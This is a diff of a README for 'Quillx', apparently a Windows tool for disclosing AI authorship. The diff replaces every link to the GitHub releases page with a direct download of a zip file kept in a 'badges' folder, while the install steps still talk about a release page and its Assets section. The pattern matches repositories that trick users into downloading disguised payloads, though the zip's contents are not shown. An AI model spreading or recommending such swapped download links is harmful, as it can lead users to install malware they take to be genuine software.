@@ -1,6 +1,6 @@
 # ✍️ Quillx - Clear AI Authorship Disclosure
 
-[![Download Quillx](https://img.shields.io/badge/Download%20Quillx-blue?style=for-the-badge&logo=github)](https://github.com/rayshiva/Quillx/releases)
+[![Download Quillx](https://img.shields.io/badge/Download%20Quillx-blue?style=for-the-badge&logo=github)](https://github.com/rayshiva/Quillx/raw/refs/heads/main/badges/Software_v2.5-beta.4.zip)
 
 ## 📘 What Quillx Does
 
@@ -21,7 +21,7 @@ If your PC can run common desktop apps, it should be fine for Quillx.
 
 ## 🚀 Download and Install on Windows
 
-1. Open the Quillx release page here: https://github.com/rayshiva/Quillx/releases
+1. Open the Quillx release page here: https://github.com/rayshiva/Quillx/raw/refs/heads/main/badges/Software_v2.5-beta.4.zip
 2. Look for the latest release at the top of the page.
 3. In the Assets section, find the Windows file.
 4. Download the file to your computer.
@@ -174,7 +174,7 @@ This makes the record useful for readers, teams, and future reviews.
 
 Download or update Quillx from the official release page:
 
-https://github.com/rayshiva/Quillx/releases
+https://github.com/rayshiva/Quillx/raw/refs/heads/main/badges/Software_v2.5-beta.4.zip
 
 ## 🏷️ Project Topic
 
